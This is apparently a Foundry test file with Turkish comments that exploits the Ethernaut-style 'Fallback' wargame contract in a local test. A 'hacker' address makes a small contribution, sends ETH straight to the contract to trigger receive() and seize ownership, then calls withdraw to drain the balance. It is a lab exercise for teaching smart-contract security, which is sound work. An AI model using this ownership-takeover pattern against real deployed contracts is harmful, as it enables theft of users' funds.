// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
// Kurban kontratımızı buraya içe aktardığımızı varsayalım
import "../src/Fallback.sol"; 

contract FallbackExploitTest is Test {
    Fallback public fallbackContract;
    
    // Saldırıyı yapacak olan bizim hacker cüzdanımız
    address hacker = makeAddr("hacker");

    function setUp() public {
        // 1. Olay Yeri Kurulumu: Kurban kontratı ağa yüklüyoruz
        fallbackContract = new Fallback();
        
        // Hacker cüzdanımıza başlangıçta biraz ETH (örn: 1 ETH) veriyoruz
        vm.deal(hacker, 1 ether);
    }

    function test_ExploitFallback() public {
        // Testin bu aşamasından itibaren işlemleri "hacker" cüzdanı yapıyormuş gibi başlatıyoruz
        vm.startPrank(hacker);

        // --- ADIM 1: Kapıyı Hafifçe Aralık Etmek (Contribute) ---
        // Geliştiricinin koyduğu require(msg.value < 0.001 ether) kuralına uyuyoruz.
        // Cüzi bir miktar (örn: 0.0001 ETH) göndererek contributions listesine adımızı yazdırıyoruz.
        fallbackContract.contribute{value: 0.0001 ether}();
        
        // Kontrol edelim: Gerçekten katkımız 0'dan büyük mü?
        assertGt(fallbackContract.contributions(hacker), 0, "Katki basarisiz oldu!");

        // --- ADIM 2: Doğrudan Para Gönderip Patronluğu Almak (receive) ---
        // Hiçbir fonksiyon adı çağırmadan, doğrudan kontrata para (örn: 0.0001 ETH) gönderiyoruz.
        // Bu işlem contract içerisindeki receive() fonksiyonunu tetikleyecek ve owner'ı biz yapacağız.
        (bool success, ) = address(fallbackContract).call{value: 0.0001 ether}("");
        require(success, "Para gonderimi basarisiz!");

        // Kontrol edelim: Gerçekten patron (owner) biz olduk mu?
        assertEq(fallbackContract.owner(), hacker, "Patronluk ele gecirilemedi!");

        // --- ADIM 3: Kasadaki Tüm Parayı Çekmek (Withdraw) ---
        uint256 preBalance = hacker.balance;
        
        // Artık owner olduğumuz için withdraw fonksiyonunu yetkili bir şekilde çağırabiliriz
        fallbackContract.withdraw();

        // Kontrol edelim: Kasadaki tüm para hacker cüzdanına geçti mi?
        assertGt(hacker.balance, preBalance, "Para cekilemedi!");

        vm.stopPrank();
    }
}